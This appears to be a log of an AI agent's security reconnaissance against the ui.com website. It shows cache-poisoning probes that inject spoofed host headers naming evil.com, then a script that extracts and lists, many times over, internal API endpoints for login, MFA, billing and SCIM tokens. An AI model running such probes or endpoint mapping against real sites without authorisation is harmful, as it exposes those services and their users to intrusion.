+x-nextjs-cache: HIT
+evil.com in body: 0
+og:url: <meta property="og:url" content="https://ui.com/"/>
+--- X-Host: evil.com
+HTTP 200
+x-nextjs-cache: HIT
+evil.com in body: 0
+og:url: <meta property="og:url" content="https://ui.com/"/>
+--- Forwarded: host=evil.com;proto=https
+HTTP 200
+x-nextjs-cache: HIT
+evil.com in body: 0
+og:url: <meta property="og:url" content="https://ui.com/"/>
+=== does cache key include query? repeat same URL, compare x-nextjs-cache ===
+x-nextjs-cache: HIT
+x-cache: Hit from cloudfront
+[0m
+Let me extract the full API path config from the account bundle to find any endpoints not yet in the inventory.
+[0m$ [0mcd /tmp/acct27
+python3 - <<'PY'
+import re
+s=open('app.js',encoding='utf-8',errors='ignore').read()
+# find all `paths:{...}` occurrences and print keys/values
+for m in re.finditer(r'paths:\{', s):
+    start=m.end()-1
+    depth=0; i=start
+    while i < len(s):
+        if s[i]=='{': depth+=1
+        elif s[i]=='}':
+            depth-=1
+            if depth==0: break
+        i+=1
+    obj=s[start:i+1]
+    if 'zendesk' in obj or 'user' in obj or 'api' in obj:
+        pairs=re.findall(r'([A-Za-z0-9_]+):`([^`]+)`', obj)
+        print("=== paths block (%d keys) ==="%len(pairs))
+        for k,v in pairs: print(f"{k}: {v}")
+PY
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_20cf2caa7001fUB18HGiI3nZyR
+
+
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+=== paths block (11 keys) ===
+zendeskUser: zendesk/user
+zendeskCreateTicket: zendesk/ticket
+zendeskOpenTickets: zendesk/tickets
+zendeskClosedTickets: zendesk/tickets/closed
+zendeskCcdTickets: zendesk/tickets/ccd
+zendeskSearchTickets: zendesk/search_tickets
+zendeskSearchCcdTickets: zendesk/search_ccd
+zendeskComments: zendesk/comments
+zendeskCreateComment: zendesk/comment
+zendeskMarkTicketAsClosed: zendesk/ticket/{ticketId}/close
+chatMessagingJwt: chat/messaging/jwt
+=== paths block (45 keys) ===
+legal: /api/sso/v1/legal
+loginUserCheck: /api/sso/v1/login/email
+idpLoginResult: /api/sso/v1/idp/login-result
+login: /api/sso/v1/login
+shopify_login: /api/sso/v1/shopify_login
+logout: /api/sso/v1/logout
+loginMFA: /api/sso/v1/login/2fa
+self: /api/sso/v1/user/self
+selfSettings: /api/sso/v1/user/self/settings
+twoFa: /api/sso/v1/user/self/2fa
+twoFaBackup: /api/sso/v1/user/self/2fa/backup
+twoFaReset: /api/sso/v1/user/self/2fa/reset
+roles: /api/sso/v1/user/self/roles
+rolesBeta: /api/sso/v1/user/{uuid}/roles/beta
+resetPassword: /api/sso/v1/password
+verifyResetRequest: /api/sso/v1/verify/password
+verifyRegistration: /api/sso/v1/verify/verification-code
+resendVerificationEmail: /api/sso/v1/verify
+createAccount: /api/sso/v2/users
+picture: /api/sso/v1/user/self/picture
+checkUsername: /api/sso/v1/search/username
+checkEmail: /api/sso/v1/search/email
+checkPassword: /api/sso/v2/password-strength
+checkPasswordV1: /api/sso/v1/password-strength
+setupLoginToken: api/sso/v1/user/self/token/setup
+approveLoginToken: api/sso/v1/user/self/token/login
+mfa: /api/sso/v1/user/self/mfa
+sendEmailV2: /api/sso/v2/user/self/mfa/email/{id}/send
+assuranceLevel: /api/sso/v1/user/self/login/level
+assuranceLevelRefresh: /api/sso/v1/user/self/login/level/refresh
+addresses: /api/sso/v1/user/self/addresses
+activity: /api/sso/v1/user/self/activity
+requestVerifyEmail: /api/sso/v1/user/self/email/verify/send
+validateAddress: /api/sso/v1/address/validator
+sessions: /api/sso/v1/user/self/sessions
+zendeskCreateOrUpdateUser: /api/sso/v1/user/self/zendesk_user
+trustedDevices: /api/sso/v1/user/self/trusted_devices
+device: /api/sso/v1/user/self/device
+emailOtp: /api/sso/v1/legacy/user/self/email/send
+verifyEmailChangeOtp: /api/sso/v1/legacy/user/self/email
+passwordlessOptions: /api/sso/v1/passwordless/options
+passwordlessLogin: /api/sso/v1/passwordless/login
+suspiciousConfirmInspect: /api/sso/v1/suspicious/confirm/inspect
+suspiciousConfirm: /api/sso/v1/suspicious/confirm
+savedAccounts: /api/sso/v1/account-chooser
+=== paths block (15 keys) ===
+msp: /api/fabrics/base/msp/v1/msp
+mspIdpEnforcement: /api/fabrics/base/msp/v1/msp/idp-enforcement
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+=== paths block (11 keys) ===
+zendeskUser: zendesk/user
+zendeskCreateTicket: zendesk/ticket
+zendeskOpenTickets: zendesk/tickets
+zendeskClosedTickets: zendesk/tickets/closed
+zendeskCcdTickets: zendesk/tickets/ccd
+zendeskSearchTickets: zendesk/search_tickets
+zendeskSearchCcdTickets: zendesk/search_ccd
+zendeskComments: zendesk/comments
+zendeskCreateComment: zendesk/comment
+zendeskMarkTicketAsClosed: zendesk/ticket/{ticketId}/close
+chatMessagingJwt: chat/messaging/jwt
+=== paths block (45 keys) ===
+legal: /api/sso/v1/legal
+loginUserCheck: /api/sso/v1/login/email
+idpLoginResult: /api/sso/v1/idp/login-result
+login: /api/sso/v1/login
+shopify_login: /api/sso/v1/shopify_login
+logout: /api/sso/v1/logout
+loginMFA: /api/sso/v1/login/2fa
+self: /api/sso/v1/user/self
+selfSettings: /api/sso/v1/user/self/settings
+twoFa: /api/sso/v1/user/self/2fa
+twoFaBackup: /api/sso/v1/user/self/2fa/backup
+twoFaReset: /api/sso/v1/user/self/2fa/reset
+roles: /api/sso/v1/user/self/roles
+rolesBeta: /api/sso/v1/user/{uuid}/roles/beta
+resetPassword: /api/sso/v1/password
+verifyResetRequest: /api/sso/v1/verify/password
+verifyRegistration: /api/sso/v1/verify/verification-code
+resendVerificationEmail: /api/sso/v1/verify
+createAccount: /api/sso/v2/users
+picture: /api/sso/v1/user/self/picture
+checkUsername: /api/sso/v1/search/username
+checkEmail: /api/sso/v1/search/email
+checkPassword: /api/sso/v2/password-strength
+checkPasswordV1: /api/sso/v1/password-strength
+setupLoginToken: api/sso/v1/user/self/token/setup
+approveLoginToken: api/sso/v1/user/self/token/login
+mfa: /api/sso/v1/user/self/mfa
+sendEmailV2: /api/sso/v2/user/self/mfa/email/{id}/send
+assuranceLevel: /api/sso/v1/user/self/login/level
+assuranceLevelRefresh: /api/sso/v1/user/self/login/level/refresh
+addresses: /api/sso/v1/user/self/addresses
+activity: /api/sso/v1/user/self/activity
+requestVerifyEmail: /api/sso/v1/user/self/email/verify/send
+validateAddress: /api/sso/v1/address/validator
+sessions: /api/sso/v1/user/self/sessions
+zendeskCreateOrUpdateUser: /api/sso/v1/user/self/zendesk_user
+trustedDevices: /api/sso/v1/user/self/trusted_devices
+device: /api/sso/v1/user/self/device
+emailOtp: /api/sso/v1/legacy/user/self/email/send
+verifyEmailChangeOtp: /api/sso/v1/legacy/user/self/email
+passwordlessOptions: /api/sso/v1/passwordless/options
+passwordlessLogin: /api/sso/v1/passwordless/login
+suspiciousConfirmInspect: /api/sso/v1/suspicious/confirm/inspect
+suspiciousConfirm: /api/sso/v1/suspicious/confirm
+savedAccounts: /api/sso/v1/account-chooser
+=== paths block (15 keys) ===
+msp: /api/fabrics/base/msp/v1/msp
+mspIdpEnforcement: /api/fabrics/base/msp/v1/msp/idp-enforcement
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+=== paths block (11 keys) ===
+zendeskUser: zendesk/user
+zendeskCreateTicket: zendesk/ticket
+zendeskOpenTickets: zendesk/tickets
+zendeskClosedTickets: zendesk/tickets/closed
+zendeskCcdTickets: zendesk/tickets/ccd
+zendeskSearchTickets: zendesk/search_tickets
+zendeskSearchCcdTickets: zendesk/search_ccd
+zendeskComments: zendesk/comments
+zendeskCreateComment: zendesk/comment
+zendeskMarkTicketAsClosed: zendesk/ticket/{ticketId}/close
+chatMessagingJwt: chat/messaging/jwt
+=== paths block (45 keys) ===
+legal: /api/sso/v1/legal
+loginUserCheck: /api/sso/v1/login/email
+idpLoginResult: /api/sso/v1/idp/login-result
+login: /api/sso/v1/login
+shopify_login: /api/sso/v1/shopify_login
+logout: /api/sso/v1/logout
+loginMFA: /api/sso/v1/login/2fa
+self: /api/sso/v1/user/self
+selfSettings: /api/sso/v1/user/self/settings
+twoFa: /api/sso/v1/user/self/2fa
+twoFaBackup: /api/sso/v1/user/self/2fa/backup
+twoFaReset: /api/sso/v1/user/self/2fa/reset
+roles: /api/sso/v1/user/self/roles
+rolesBeta: /api/sso/v1/user/{uuid}/roles/beta
+resetPassword: /api/sso/v1/password
+verifyResetRequest: /api/sso/v1/verify/password
+verifyRegistration: /api/sso/v1/verify/verification-code
+resendVerificationEmail: /api/sso/v1/verify
+createAccount: /api/sso/v2/users
+picture: /api/sso/v1/user/self/picture
+checkUsername: /api/sso/v1/search/username
+checkEmail: /api/sso/v1/search/email
+checkPassword: /api/sso/v2/password-strength
+checkPasswordV1: /api/sso/v1/password-strength
+setupLoginToken: api/sso/v1/user/self/token/setup
+approveLoginToken: api/sso/v1/user/self/token/login
+mfa: /api/sso/v1/user/self/mfa
+sendEmailV2: /api/sso/v2/user/self/mfa/email/{id}/send
+assuranceLevel: /api/sso/v1/user/self/login/level
+assuranceLevelRefresh: /api/sso/v1/user/self/login/level/refresh
+addresses: /api/sso/v1/user/self/addresses
+activity: /api/sso/v1/user/self/activity
+requestVerifyEmail: /api/sso/v1/user/self/email/verify/send
+validateAddress: /api/sso/v1/address/validator
+sessions: /api/sso/v1/user/self/sessions
+zendeskCreateOrUpdateUser: /api/sso/v1/user/self/zendesk_user
+trustedDevices: /api/sso/v1/user/self/trusted_devices
+device: /api/sso/v1/user/self/device
+emailOtp: /api/sso/v1/legacy/user/self/email/send
+verifyEmailChangeOtp: /api/sso/v1/legacy/user/self/email
+passwordlessOptions: /api/sso/v1/passwordless/options
+passwordlessLogin: /api/sso/v1/passwordless/login
+suspiciousConfirmInspect: /api/sso/v1/suspicious/confirm/inspect
+suspiciousConfirm: /api/sso/v1/suspicious/confirm
+savedAccounts: /api/sso/v1/account-chooser
+=== paths block (15 keys) ===
+msp: /api/fabrics/base/msp/v1/msp
+mspIdpEnforcement: /api/fabrics/base/msp/v1/msp/idp-enforcement
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
+archivedDeviceBackups: /ucore/archived-backups
+applicationDevices: /devices/{deviceId}/application-devices
+=== paths block (1 keys) ===
+subscriptions: /api/v1/users/integrations/ssoa/subscriptions
+=== paths block (1 keys) ===
+devices: /api/v1/devices/integrations/ssoa
+=== paths block (4 keys) ===
+subscriptions: /api/v1/subscriptions
+mspSubscriptions: /api/v1/msps/subscriptions
+plans: /api/v2/products/plans
+licenseCode: /api/v1/licenseCodes/validation
+=== paths block (6 keys) ===
+availability: /v1/users/self/subscription-availability
+plans: /v1/users/self/subscription-plans
+storageRegions: /v1/users/self/storage-regions
+subscriptions: /v1/users/self/subscriptions
+settings: /v1/users/self/settings
+usage: /v1/users/self/usage
+=== paths block (2 keys) ===
+cancelSubscription: /api/v2/subscribe
+transferSubscription: /api/v2/subscriptions/{stripeSubscriptionId}/transfer
+=== paths block (11 keys) ===
+zendeskUser: zendesk/user
+zendeskCreateTicket: zendesk/ticket
+zendeskOpenTickets: zendesk/tickets
+zendeskClosedTickets: zendesk/tickets/closed
+zendeskCcdTickets: zendesk/tickets/ccd
+zendeskSearchTickets: zendesk/search_tickets
+zendeskSearchCcdTickets: zendesk/search_ccd
+zendeskComments: zendesk/comments
+zendeskCreateComment: zendesk/comment
+zendeskMarkTicketAsClosed: zendesk/ticket/{ticketId}/close
+chatMessagingJwt: chat/messaging/jwt
+=== paths block (45 keys) ===
+legal: /api/sso/v1/legal
+loginUserCheck: /api/sso/v1/login/email
+idpLoginResult: /api/sso/v1/idp/login-result
+login: /api/sso/v1/login
+shopify_login: /api/sso/v1/shopify_login
+logout: /api/sso/v1/logout
+loginMFA: /api/sso/v1/login/2fa
+self: /api/sso/v1/user/self
+selfSettings: /api/sso/v1/user/self/settings
+twoFa: /api/sso/v1/user/self/2fa
+twoFaBackup: /api/sso/v1/user/self/2fa/backup
+twoFaReset: /api/sso/v1/user/self/2fa/reset
+roles: /api/sso/v1/user/self/roles
+rolesBeta: /api/sso/v1/user/{uuid}/roles/beta
+resetPassword: /api/sso/v1/password
+verifyResetRequest: /api/sso/v1/verify/password
+verifyRegistration: /api/sso/v1/verify/verification-code
+resendVerificationEmail: /api/sso/v1/verify
+createAccount: /api/sso/v2/users
+picture: /api/sso/v1/user/self/picture
+checkUsername: /api/sso/v1/search/username
+checkEmail: /api/sso/v1/search/email
+checkPassword: /api/sso/v2/password-strength
+checkPasswordV1: /api/sso/v1/password-strength
+setupLoginToken: api/sso/v1/user/self/token/setup
+approveLoginToken: api/sso/v1/user/self/token/login
+mfa: /api/sso/v1/user/self/mfa
+sendEmailV2: /api/sso/v2/user/self/mfa/email/{id}/send
+assuranceLevel: /api/sso/v1/user/self/login/level
+assuranceLevelRefresh: /api/sso/v1/user/self/login/level/refresh
+addresses: /api/sso/v1/user/self/addresses
+activity: /api/sso/v1/user/self/activity
+requestVerifyEmail: /api/sso/v1/user/self/email/verify/send
+validateAddress: /api/sso/v1/address/validator
+sessions: /api/sso/v1/user/self/sessions
+zendeskCreateOrUpdateUser: /api/sso/v1/user/self/zendesk_user
+trustedDevices: /api/sso/v1/user/self/trusted_devices
+device: /api/sso/v1/user/self/device
+emailOtp: /api/sso/v1/legacy/user/self/email/send
+verifyEmailChangeOtp: /api/sso/v1/legacy/user/self/email
+passwordlessOptions: /api/sso/v1/passwordless/options
+passwordlessLogin: /api/sso/v1/passwordless/login
+suspiciousConfirmInspect: /api/sso/v1/suspicious/confirm/inspect
+suspiciousConfirm: /api/sso/v1/suspicious/confirm
+savedAccounts: /api/sso/v1/account-chooser
+=== paths block (15 keys) ===
+msp: /api/fabrics/base/msp/v1/msp
+mspIdpEnforcement: /api/fabrics/base/msp/v1/msp/idp-enforcement
+logo: /api/fabrics/base/msp/v1/logo
+idp: /api/fabrics/base/msp/v1/idp
+idpConfiguration: /api/fabrics/base/msp/v1/idp/configuration
+idpCredentials: /api/fabrics/base/msp/v1/idp/credentials
+idpRebind: /api/fabrics/base/msp/v1/idp/rebind
+idpRetryConfigure: /api/fabrics/base/msp/v1/idp/retry-configure
+idpSync: /api/fabrics/base/msp/v1/idp/sync
+idpSyncJob: /api/fabrics/base/msp/v1/idp/sync-jobs/{jobId}
+idpSyncTargets: /api/fabrics/base/msp/v1/idp/sync-targets
+idpDirectoryGroups: /api/fabrics/base/msp/v2/idp/directory/groups
+idpDomainVerify: /api/fabrics/base/msp/v1/idp/domain/verify
+idpScimToken: /api/fabrics/base/msp/v1/idp/scim-token
+idpScimTokenRegenerate: /api/fabrics/base/msp/v1/idp/scim-token/regenerate
+=== paths block (20 keys) ===
+subscriptionsSingle: /api/v2/subscriptions
+customer: /api/v2/customers/self
+cards: /api/v2/customers/self/payment-methods/cards
+paymentMethodsTapPay: /api/v2/customers/self/payment-methods/tappay
+paymentMethods: /api/v2/customers/self/payment-methods
+subscriptions: /api/v2/customers/self/subscriptions
+products: /api/v2/products
+invoices: /api/v2/customers/self/invoices
+invoiceLines: /api/v2/invoices/{invoiceId}/lines
+invoicesUpcoming: /api/v2/customers/self/invoices/preview
+invoicePay: /api/v2/invoices/{invoiceId}/pay
+taxId: /api/v2/customers/self/tax-ids
+uiTaxId: /api/v2/accounts/tax-ids
+businessProfile: /api/v2/accounts/business-profile
+invoiceYears: /api/v2/customers/self/invoices/available-years
+billingDetails: /api/v2/customers/self/billing-details
+pdf: /api/v2/customers/self/invoices/{invoiceId}/pdf
+setupIntents: /api/v2/customers/self/setup-intents
+attachPm: /api/v2/customers/self/setup-intents/{setiId}/attach-pm
+upcomingPDF: /api/v2/customers/self/invoices/upcoming/pdf
+=== paths block (4 keys) ===
+listOrgs: /api/v1/organizations
+subscriptions: /api/v1/organizations/{orgId}/billing/v2/customers/self/subscriptions
+invoices: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices
+invoiceYears: /api/v1/organizations/{orgId}/billing/v2/customers/self/invoices/available-years
+=== paths block (4 keys) ===
+esimPlans: /api/v1/esim/plans
+esimDevices: /api/v1/esim/devices
+esimOrders: /api/v1/esim/orders
+esimRenewals: /api/v1/esim/renewals
+=== paths block (3 keys) ===
+active: /api/v2/scheduled-maintenances/active.json
+upcoming: /api/v2/scheduled-maintenances/upcoming.json
+incidents: /api/v2/incidents/unresolved.json
+=== paths block (8 keys) ===
+auth: /create-credentials
+backup: /ucore/backup
+devices: /devices
+hosts: /api/v1/hosts
+sites: /sites
+deviceBackups: /ucore/backups
